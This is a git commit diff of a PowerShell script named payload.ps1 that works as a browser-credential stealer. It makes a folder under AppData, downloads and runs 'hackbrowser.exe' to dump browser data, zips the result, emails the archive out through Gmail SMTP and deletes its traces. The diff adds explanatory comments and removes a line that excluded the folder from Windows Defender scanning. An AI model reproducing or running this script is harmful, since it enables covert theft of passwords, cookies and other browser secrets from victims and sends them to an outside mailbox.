6b862f11ff41349946112065933e70e61a550305
GamehunterKaan <68380968+GamehunterKaan@users.noreply.github.com>
2022-02-01 22:25:42 +0300

    Update payload.ps1

--- payload.ps1
+++ payload.ps1
@@ -1,11 +1,14 @@
+#Creating the directory we will work on
 mkdir "$env:appdata\Microsoft\dump"
 Set-Location "$env:appdata\Microsoft\dump"
-Add-MpPreference -ExclusionPath "$env:appdata\Microsoft\dump"
+#Downloading and executing hackbrowser.exe
 Invoke-WebRequest 'hackbrowser.exe file link' -OutFile "hb.exe"
 .\hb.exe --format json
 Remove-Item -Path "$env:appdata\Microsoft\dump\hb.exe" -Force
+#Creating A Zip Archive
 Compress-Archive -Path * -DestinationPath dump.zip
 $Random = Get-Random
+#Mailing the output you will need to enable less secure app access on your google account for this to work
 $Message = new-object Net.Mail.MailMessage
 $smtp = new-object Net.Mail.SmtpClient("smtp.gmail.com", 587)
 $smtp.Credentials = New-Object System.Net.NetworkCredential("your email address", "your email password");
@@ -21,5 +24,6 @@ $Message.Attachments.Add("$env:appdata\Microsoft\dump\dump.zip")
 $smtp.Send($Message)
 $Message.Dispose()
 $smtp.Dispose()
+#Cleanup
 cd "$env:appdata"
 Remove-Item -Path "$env:appdata\Microsoft\dump" -Force -Recurse
